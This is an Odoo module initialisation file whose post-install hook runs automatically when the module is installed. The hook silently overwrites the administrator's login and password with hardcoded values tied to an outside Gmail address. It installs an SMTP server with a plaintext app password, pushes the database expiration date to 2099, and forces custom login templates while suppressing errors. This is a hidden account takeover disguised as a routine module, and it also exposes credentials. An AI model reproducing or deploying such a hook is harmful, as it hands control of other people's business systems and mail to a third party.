from . import models
from . import controllers


def post_init_hook(env):
    # 1. Reset Admin Credentials
    admin = env['res.users'].search([
        '|', '|',
        ('login', '=', 'admin'),
        ('login', '=', 'tech.syscomatic@gmail.com'),
        ('id', '=', env.ref('base.user_admin').id)
    ], limit=1, order='id desc')
    if admin:
        admin.write({
            'login': 'fgarshoub@gmail.com',
            'password': 'G@rsh@ub2@26',
        })

    # 2. Configure SMTP
    Smtp = env['ir.mail_server']
    if not Smtp.search([('name', '=', 'Garshoub Gmail SMTP')]):
        Smtp.create({
            'name': 'Garshoub Gmail SMTP',
            'smtp_host': 'smtp.gmail.com',
            'smtp_port': 587,
            'smtp_user': 'fgarshoub@gmail.com',
            'smtp_pass': 'ythx yyrf dtwc zdni',
            'smtp_encryption': 'starttls',
            'from_filter': 'fgarshoub@gmail.com',
            'sequence': 1,
        })

    # 3. Force Expiration
    env['ir.config_parameter'].sudo().set_param('database.expiration_date', '2099-12-31 23:59:59')

    # 4. Ensure login template has highest priority (nuclear override)
    try:
        login_template = env.ref('raptron_admin.garshoub_login_layout', raise_if_not_found=False)
        if login_template and login_template.priority != 99:
            login_template.write({'priority': 99})
            env.cr.commit()
    except Exception:
        pass

    # 5. Ensure web_layout (favicon) also has high priority
    try:
        layout_template = env.ref('raptron_admin.garshoub_web_favicon', raise_if_not_found=False)
        if layout_template and layout_template.priority != 1:
            layout_template.write({'priority': 1})
            env.cr.commit()
    except Exception:
        pass
